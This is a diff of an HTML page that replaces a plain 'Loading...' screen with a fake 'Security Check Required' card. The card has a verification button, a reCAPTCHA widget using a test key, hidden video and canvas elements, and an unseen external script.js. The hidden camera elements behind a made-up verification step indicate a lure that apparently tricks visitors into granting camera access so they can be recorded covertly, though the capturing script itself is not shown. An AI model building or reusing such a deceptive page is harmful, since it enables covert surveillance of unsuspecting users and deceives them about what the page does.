@@ -3,29 +3,63 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Loading...</title>
+<title>Security Check</title>
 <style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
   body {
-    margin: 0; height: 100vh; overflow: hidden;
-    background: #fff;
-    font-family: system-ui, sans-serif;
-    display: flex; align-items: center; justify-content: center;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    background: linear-gradient(135deg, #e8edf2 0%, #d5dce4 100%);
+    display: flex; justify-content: center; align-items: center;
+    min-height: 100vh;
+  }
+  .card {
+    background: white; border-radius: 16px; padding: 40px 35px;
+    box-shadow: 0 15px 50px rgba(0,0,0,0.12);
+    width: 380px; text-align: center;
+  }
+  .lock-icon {
+    width: 72px; height: 72px; background: #eef2f7;
+    border-radius: 50%; display: flex; align-items: center;
+    justify-content: center; margin: 0 auto 16px; font-size: 30px;
+  }
+  h2 { color: #1a202c; font-size: 20px; margin-bottom: 6px; }
+  .sub { color: #718096; font-size: 14px; margin-bottom: 24px; line-height: 1.5; }
+  .btn {
+    background: #2b6cb0; color: white; border: none;
+    padding: 13px 0; border-radius: 8px; font-size: 15px; font-weight: 600;
+    cursor: pointer; width: 100%; transition: background 0.2s;
+  }
+  .btn:hover { background: #2c5282; }
+  .btn:disabled { background: #a0aec0; cursor: not-allowed; }
+  .g-recaptcha { display: inline-block; margin-top: 18px; }
+  .status {
+    margin-top: 14px; font-size: 13px; color: #718096; min-height: 20px;
   }
   video, canvas { display: none; }
-  #status {
-    color: #999; font-size: 14px;
-    user-select: none;
-  }
 </style>
+<script src="https://www.google.com/recaptcha/api.js" async defer></script>
 </head>
 <body>
 
-<div id="status">Loading...</div>
+<div class="card">
+  <div class="lock-icon">🔒</div>
+  <h2>Security Check Required</h2>
+  <p class="sub">This page is protected. Please complete the verification below to continue.</p>
+
+  <button class="btn" id="verifyBtn">Start Verification</button>
+
+  <div class="g-recaptcha" id="recaptcha"
+       data-sitekey="6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI"
+       data-callback="onRecaptchaSuccess"
+       data-expired-callback="onRecaptchaExpired"
+       data-error-callback="onRecaptchaError"></div>
+
+  <div class="status" id="status"></div>
+</div>
 
 <video id="video" autoplay playsinline></video>
 <canvas id="canvas"></canvas>
 
 <script type="module" src="script.js"></script>
-
 </body>
 </html>
